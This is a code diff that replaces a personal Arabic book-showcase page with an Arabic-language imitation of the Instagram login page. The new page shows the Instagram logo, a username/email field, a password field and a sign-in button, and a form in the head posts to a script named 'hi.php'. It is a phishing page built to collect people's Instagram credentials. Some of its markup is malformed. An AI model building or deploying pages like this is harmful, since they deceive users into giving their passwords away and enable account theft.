@@ -1,52 +1,119 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
+    <link rel="stylesheet" href="styles.css">
+    <link rel>
+    <form action="hi.php" method="POST">
+
     <meta charset="UTF-8">
-    <title>Amine - Library</title>
+    <title>تسجيل دخول انستجرام</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <link rel="stylesheet" href="style.css">
+    <style>
+        body {
+            background: #fafafa;
+            font-family: 'Tahoma', Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .login-container {
+            background: #fff;
+            border: 1px solid #dbdbdb;
+            padding: 40px 30px;
+            width: 320px;
+            border-radius: 8px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        .logo {
+            margin-bottom: 30px;
+        }
+        .logo img {
+            width: 150px;
+        }
+        .input-field {
+            width: 100%;
+            margin-bottom: 10px;
+        }
+        .input-field input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #dbdbdb;
+            border-radius: 4px;
+            background: #fafafa;
+            font-size: 14px;
+        }
+        .login-btn {
+            width: 100%;
+            padding: 10px;
+            background: #3897f0;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+            font-size: 15px;
+        }
+        .divider {
+            display: flex;
+            align-items: center;
+            text-align: center;
+            margin: 20px 0;
+            color: #999;
+        }
+        .divider::before, .divider::after {
+            content: '';
+            flex: 1;
+            border-bottom: 1px solid #dbdbdb;
+        }
+        .divider:not(:empty)::before {
+            margin-left: .5em;
+        }
+        .divider:not(:empty)::after {
+            margin-right: .5em;
+        }
+        .forgot {
+            margin-top: 15px;
+            font-size: 13px;
+        }
+        .signup {
+            margin-top: 20px;
+            padding: 20px 0 0 0;
+            text-align: center;
+            font-size: 14px;
+        }
+        .signup a {
+            color: #3897f0;
+            text-decoration: none;
+            font-weight: bold;
+        }
+    </style>
 </head>
 <body>
-    <canvas id="bgBooks"></canvas>
-    <div class="content">
-        <header>
-            <h1>Amine Library</h1>
-            <p>اكتشف مؤلفاتي وشارك شغف القراءة</p>
-            <nav>
-                <button class="nav-btn" onclick="scrollToSection('books')">📚 معرض الكتب</button>
-                <button class="nav-btn" onclick="scrollToSection('about')">ℹ️ حول</button>
-                <button class="nav-btn" onclick="contactMe()">✉️ اتصل بي</button>
-            </nav>
-        </header>
-        <main>
-            <section id="books">
-                <h2>معرض الكتب</h2>
-                <div class="books-gallery">
-                    <!-- يمكنك إضافة كتبك هنا -->
-                    <div class="book-card" onclick="window.open('https://link-to-your-book1.com')">
-                        <img src="https://i.pinimg.com/736x/97/38/b8/9738b8d813d30977a0d73f854665b096.jpg" alt="كتاب 1">
-                        <h3>اسم الكتاب 1</h3>
-                        <p>غير جاهز حاليا</p>
-                    </div>
-                    <div class="book-card" onclick="window.open('https://link-to-your-book2.com')">
-                        <img src="file:///C:/Users/Amine/Downloads/Untitled-2.png" alt="كتاب 2">
-                        <h3>اسم الكتاب 2</h3>
-                        <p>غير جاهز حاليا</p>
-                    </div>
-                    <!-- أضف المزيد حسب الحاجة -->
-                </div>
-            </section>
-            <section id="about">
-                <h2>عن الموقع</h2>
-                <p>
-                    هذا الموقع انشأته لمحبي القراءة كل كتاب ثمرة جهد وحب للكتابة.
-                </p>
-            </section>
-        </main>
-        <footer>
-            <span>جميع الحقوق محفوظة &copy; 2025 - أمين</span>
-        </footer>
+    <div class="login-container">
+        <div class="logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo">
+        </div>
+        <form>
+            <div class="input-field">
+                <input type="text" placeholder="اسم المستخدم أو البريد الإلكتروني" required>
+            </div>
+            <div class="input-field">
+                <input type="password" placeholder="كلمة المرور" required>
+            </div>
+            <button class="login-btn" type="submit">تسجيل الدخول</button>
+        </form>
+        <div class="divider">أو</div>
+        <div class="forgot">
+            <a href="#">هل نسيت كلمة المرور؟</a>
+        </div>
+        <div class="signup">
+            ليس لديك حساب؟ <a href="#">سجّل الآن</a>
+        </div>
     </div>
-    <script src="script.js"></script>
 </body>
 </html>
